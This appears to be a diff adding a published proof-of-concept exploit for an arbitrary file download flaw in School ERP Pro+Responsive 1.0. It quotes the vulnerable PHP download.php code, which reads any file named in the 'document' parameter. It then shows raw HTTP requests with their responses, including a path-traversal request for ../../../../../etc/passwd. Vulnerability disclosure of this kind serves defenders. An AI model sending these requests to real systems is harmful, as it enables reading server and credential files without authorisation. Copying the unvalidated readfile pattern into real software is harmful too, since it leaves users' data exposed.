@@ -1,0 +1,64 @@
+# Exploit Title: School ERP Pro+Responsive 1.0 - Arbitrary File Download
+# Dork: N/A
+# Date: 2018-10-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.arox.in/
+# Software Link: https://sourceforge.net/projects/school-management-system-php/files/latest/download
+# Software Link: http://erp.arox.in/ http://erp1.arox.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/student_staff/download.php?document=[FILE]
+# http://localhost/[PATH]/office_admin/download.php?document=[FILE]
+# 
+# /[PATH]/student_staff/download.php
+# /[PATH]/office_admin/download.php
+# ....
+# if ( isset($_REQUEST["document"])&&$_REQUEST["document"]!="") {
+# $file = $_REQUEST['document'];
+# header("Content-type: application/force-download");
+# header("Content-Transfer-Encoding: Binary");
+# header("Content-length: ".filesize($file));
+# header("Content-disposition: attachment; filename=\"".$file."\"");
+# readfile($file);
+# exit;
+# }
+# ....
+
+GET /[PATH]/student_staff/download.php?document=download.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 23 Oct 2018 12:30:01 GMT
+Server: Apache
+Content-Transfer-Encoding: Binary
+Content-Disposition: attachment; filename="download.php"
+Content-Length: 337
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/force-download
+
+GET /[PATH]/office_admin/download.php?document=../../../../../etc/passwd HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Tue, 23 Oct 2018 12:31:34 GMT
+Server: Apache
+Content-Transfer-Encoding: Binary
+Content-Disposition: attachment; filename="../../../../../etc/passwd"
+Content-Length: 46368
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: application/force-download
